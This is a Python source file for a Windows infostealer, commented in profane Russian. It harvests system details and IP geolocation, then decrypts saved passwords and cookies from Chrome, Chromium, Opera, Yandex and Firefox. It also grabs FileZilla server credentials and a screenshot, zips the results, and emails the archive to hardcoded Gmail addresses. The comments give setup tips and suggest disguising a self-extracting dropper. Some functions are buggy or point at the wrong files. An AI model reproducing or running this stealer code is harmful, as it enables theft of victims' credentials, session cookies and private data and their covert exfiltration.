import os
from Crypto.Hash import SHA512
import sqlite3
import win32crypt
import email, ssl
import shutil
import requests
import zipfile
import getpass
import ip2geotools
import win32api
import platform
import tempfile
import smtplib
import time
import cv2
import sys
from PIL import ImageGrab
from email.mime.multipart import MIMEMultipart 
from email.mime.base import MIMEBase 
from email.message import Message
from email.mime.multipart import MIMEBase
from email.mime.text import MIMEText
from email.utils import COMMASPACE, formatdate
from email import encoders
from Tools.demo.mcast import sender
from ip2geotools.databases.noncommercial import DbIpCity
from os.path import basename
from smtplib import SMTP
from email.header import Header
from email.utils import parseaddr, formataddr
from base64 import encodebytes
import random
#позапускай, покачай модули выше, если что то отъебывает, обнови пип, прочитал на форуме сайберхак точка ру. не пиздят

################################################################################
#                              ВСЕ ДАННЫЕ И ЛОКАЦИЯ                            #
################################################################################
drives = str(win32api.GetLogicalDriveStrings())
drives = str(drives.split('\000')[:-1])
response = DbIpCity.get(requests.get("https://ramziv.com/ip").text, api_key='free')
all_data = "Time: " + time.asctime() + '\n' + "Кодировка ФС: " + sys.getfilesystemencoding() + '\n' + "Cpu: " + platform.processor() + '\n' + "Система: " + platform.system() + ' ' + platform.release() + '\nIP: '+requests.get("https://ramziv.com/ip").text+'\nГород: '+response.city+'\nGen_Location:' + response.to_json() + '\nДиски:' + drives
file = open(os.getenv("APPDATA") + '\\alldata.txt', "w+") #создаем txt с его расположением
file.write(all_data)#записываем данные
file.close()#выходим

################################################################################
#      пиздим гугл пароли если ты ебаный инвалид укажи пути для куки тут же    #
################################################################################
def Chrome():
   text = 'Passwords Chrome:' + '\n'
   text += 'URL | LOGIN | PASSWORD' + '\n'
   if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data'):
       shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data', os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
       conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
       cursor = conn.cursor()
       cursor.execute('SELECT action_url, username_value, password_value FROM logins')
       for result in cursor.fetchall():
           password = win32crypt.CryptUnprotectData(result[2])[1].decode()
           login = result[1]
           url = result[0]
           if password != '':
               text += url + ' | ' + login + ' | ' + password + '\n'
   return text
file = open(os.getenv("APPDATA") + '\\google_pass.txt', "w+") #создаем txt с его расположением
file.write(str(Chrome()) + '\n')#записываем данные
file.close()

################################################################################
#                      оставлю у меня работает и так (куки гугла)              #
################################################################################
def Chrome_cockie():
   textc = 'Cookies Chrome:' + '\n'
   textc += 'URL | COOKIE | COOKIE NAME' + '\n'
   if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies'):
       shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies', os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies2')
       conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies2')
       cursor = conn.cursor()
       cursor.execute("SELECT * from cookies")
       for result in cursor.fetchall():
           cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
           name = result[2]
           url = result[1]
           textc += url + ' | ' + str(cookie) + ' | ' + name + '\n'
   return textc
file = open(os.getenv("APPDATA") + '\\google_cookies.txt', "w+")
file.write(str(Chrome_cockie()) + '\n')
file.close()

################################################################################
#                              огонь лиса печенье                              #
################################################################################
def Firefox():
   textf = ''
   textf +='Firefox Cookies:' + '\n'
   textf += 'URL | COOKIE | COOKIE NAME' + '\n'
   for root, dirs, files in os.walk(os.getenv("APPDATA") + '\\Mozilla\\Firefox\\Profiles'):
       for name in dirs:
           conn = sqlite3.connect(os.path.join(root, name)+'\\cookies.sqlite')
           cursor = conn.cursor()
           cursor.execute("SELECT baseDomain, value, name FROM moz_cookies")
           data = cursor.fetchall()
           for i in range(len(data)):
               url, cookie, name = data[i]
               textf += url + ' | ' + str(cookie) + ' | ' + name + '\n'
       break
   return textf
file = open(os.getenv("APPDATA") + '\\firefox_cookies.txt', "w+")
file.write(str(Firefox()) + '\n')
file.close()

################################################################################
#                              пароли движка хромиум                           #
################################################################################
def chromium():
   textch ='Chromium Passwords:' + '\n'
   textch += 'URL | LOGIN | PASSWORD' + '\n'
   if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default'):
       shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Login Data', os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Login Data2')
       conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Login Data2')
       cursor = conn.cursor()
       cursor.execute('SELECT action_url, username_value, password_value FROM logins')
       for result in cursor.fetchall():
           password = win32crypt.CryptUnprotectData(result[2])[1].decode()
           login = result[1]
           url = result[0]
           if password != '':
               textch += url + ' | ' + login + ' | ' + password + '\n'
               return textch
file = open(os.getenv("APPDATA") + '\\chromium.txt', "w+")
file.write(str(chromium()) + '\n')
file.close()

################################################################################
#        куки движка хромиум(для всяких ебланских браузеров - амиго и тд)      #
################################################################################
def chromiumc():
   textchc = ''
   textchc +='Chromium Cookies:' + '\n'
   textchc += 'URL | COOKIE | COOKIE NAME' + '\n'
   if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Cookies'):
       shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Cookies', os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Cookies2')
       conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Cookies2')
       cursor = conn.cursor()
       cursor.execute("SELECT * from cookies")
       for result in cursor.fetchall():
           cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
           name = result[2]
           url = result[1]
           textchc += url + ' | ' + str(cookie) + ' | ' + name + '\n'
   return textchc
file = open(os.getenv("APPDATA") + '\\chromium_cookies.txt', "w+")
file.write(str(chromiumc()) + '\n')
file.close()

################################################################################
#                              опера пароли                                    #
################################################################################
def Opera():
   texto = 'Passwords Opera:' + '\n'
   texto += 'URL | LOGIN | PASSWORD' + '\n'
   if os.path.exists(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data'):
       shutil.copy2(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data', os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data2')
       conn = sqlite3.connect(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data2')
       cursor = conn.cursor()
       cursor.execute('SELECT action_url, username_value, password_value FROM logins')
       for result in cursor.fetchall():
           password = win32crypt.CryptUnprotectData(result[2])[1].decode()
           login = result[1]
           url = result[0]
           if password != '':
               texto += url + ' | ' + login + ' | ' + password + '\n'
file = open(os.getenv("APPDATA") + '\\opera_pass.txt', "w+")
file.write(str(Opera()) + '\n')
file.close()

################################################################################
#                              огонь лиса пароль                               #
################################################################################
def Firefox_cookies():
   texto = 'Passwords firefox:' + '\n'
   texto += 'URL | LOGIN | PASSWORD' + '\n'
   if os.path.exists(os.getenv("APPDATA") + '\\AppData\\Roaming\\Mozilla\\Firefox'):
       shutil.copy2(os.getenv("APPDATA") + '\\AppData\\Roaming\\Mozilla\\Firefox2', os.getenv("APPDATA") + '\\AppData\\Roaming\\Mozilla\\Firefox2')
       conn = sqlite3.connect(os.getenv("APPDATA") + '\\AppData\\Roaming\\Mozilla\\Firefox2')
       cursor = conn.cursor()
       cursor.execute('SELECT action_url, username_value, password_value FROM logins')
       for result in cursor.fetchall():
           password = win32crypt.CryptUnprotectData(result[2])[1].decode()
           login = result[1]
           url = result[0]
           if password != '':
               texto += url + ' | ' + login + ' | ' + password + '\n'
file = open(os.getenv("APPDATA") + '\\firefox_pass.txt', "w+")
file.write(str(Firefox_cookies()) + '\n')
file.close()

#####################################################################################################################
#     яндекс пароли (если низуя не робит, добавь модуль который читает пользователя и будет тебе его сюда въебывать)#
#     import os                                                                                                     #
# from os import getlogin                                                                                           #
# import wget  и wget не забудь заимпортить если ты самораспаковывающуюся суку хочешь сделать                       #                                                                             #                                                                             #
#   name_0f_user = getlogin()                                                                                       #
#   os.system("C:/Users/" + name_0f_user + "/сюда дирректорию/тут файл типо как пример") замаскируй эту ебалу пж    #
#   я вот так реализовал, но тут робит и без этой пизды                                                             #
#####################################################################################################################
def Yandexpass():
    textyp = 'Passwords Yandex:' + '\n'
    textyp += 'URL | LOGIN | PASSWORD' + '\n'
    if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default\\Ya Login Data.db'):
        shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default\\Ya Login Data.db', os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default\\Ya Login Data2.db')
        conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Yandexe\\YandexBrowser\\User Data\\Default\\Ya Login Data2.db')
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        for result in cursor.fetchall():
            password = win32crypt.CryptUnprotectData(result[2])[1].decode()
            login = result[1]
            url = result[0]
            if password != '':
                textyp += url + ' | ' + login + ' | ' + password + '\n'
    return textyp
file = open(os.getenv("APPDATA") + '\\yandex_passwords.txt', "w+")
file.write(str(Yandexpass()) + '\n')
file.close()

################################################################################
#                             опера печенье                                    #
################################################################################
def Opera_c():
    textoc ='Cookies Opera:' + '\n'
    textoc += 'URL | COOKIE | COOKIE NAME' + '\n'
    if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies'):
      shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies', os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies2')
      conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies2')
      cursor = conn.cursor()
      cursor.execute("SELECT * from cookies")
      for result in cursor.fetchall():
           cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
           name = result[2]
           url = result[1]
           textoc += url + ' | ' + str(cookie) + ' | ' + name + '\n'
    return textoc
file = open(os.getenv("APPDATA") + '\\opera_cookies.txt', "w+")
file.write(str(Opera_c()) + '\n')
file.close()

################################################################################
#  угоняем сервера файлзиллы, есть желание аддните майкрасофт серверс          #
################################################################################
def filezilla():
   try:
       data = ''
       if os.path.isfile(os.getenv("APPDATA") + '\\FileZilla\\recentservers.xml') is True:
           root = etree.parse(os.getenv("APPDATA") + '\\FileZilla\\recentservers.xml').getroot()

           for i in range(len(root[0])):
               host = root[0][i][0].text
               port = root[0][i][1].text
               user = root[0][i][4].text
               password = base64.b64decode(root[0][i][5].text).decode('utf-8')
               data += 'host: ' + host + '|port: ' + port + '|user: ' + user + '|pass: ' + password + '\n'
           return data
       else:
           return 'Not found'
   except Exception:
       return 'Error'
textfz = filezilla()
textfz += 'Filezilla: ' + '\n' + filezilla() + '\n'
file = open(os.getenv("APPDATA") + '\\filezilla.txt', "w+")
file.write(str(filezilla()) + '\n')
file.close()

################################################################################
#                             по дефолту делаем скрин экрана                   #
################################################################################
screen = ImageGrab.grab()
screen.save(os.getenv("APPDATA") + '\\sreenshot.jpg')

################################################################################
#               запаковка всего мусора выше в зипп                             #
################################################################################
zname = r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Local\\Temp\\LOG.zip'
NZ = zipfile.ZipFile(zname,'w')
NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\firefox_pass.txt')
NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\firefox_cookies.txt')
NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\yandex_passwords.txt')
NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\alldata.txt')
NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\google_pass.txt')
NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\google_cookies.txt')
NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\chromium.txt')
NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\chromium_cookies.txt')
NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\amigo_pass.txt')
NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\amigo_cookies.txt')
NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\opera_pass.txt')
NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\opera_cookies.txt')
NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\filezilla.txt')
NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\sreenshot.jpg')
NZ.close()

################################################################################
#                              нахуй иди э                                     #
################################################################################
doc = 'C:\\Users\\' + getpass.getuser() + '\\AppData\\Local\\Temp\\LOG.zip'

################################################################################
#                              ОТПРАВКА НАХУЙ НА ПОЧТУ!!!!!                    #
################################################################################
'↑подарок от энфейла↑'.encode('utf-8')
msgtext = MIMEText('↑подарок от энфейла↑'.encode('utf-8'), 'plain', 'utf-8')
msg = MIMEMultipart()
msg['From'] = 'stealerdoesntworking@gmail.com'
msg['To'] = 'razerglorious@gmail.com'
msg['Subject'] = getpass.getuser() + '-PC'
msg.attach(msgtext)

################################################################################
#                              СОЗДАНИЕ Вложения                                #
################################################################################
part = MIMEBase('application', "zip")
b = open(doc, "rb").read()
bs = encodebytes(b).decode()
part.set_payload(bs)
part.add_header('Content-Transfer-Encoding', 'base64')
part.add_header('Content-Disposition', 'attachment; filename="LOG.zip"')
msg.attach(part)

################################################################################
#                              ну вам на пошту                                 #
################################################################################
s = smtplib.SMTP('smtp.gmail.com', 587)#ваш почтовый сервис,советую создавать новую гмаил
s.starttls()
s.login('ваша почта(ur mail)', 'pass')
s.sendmail('ваша почта', 'почта на которую отправлять', msg.as_string())
s.quit()
i = input()
#передаю привет всем сочувствующим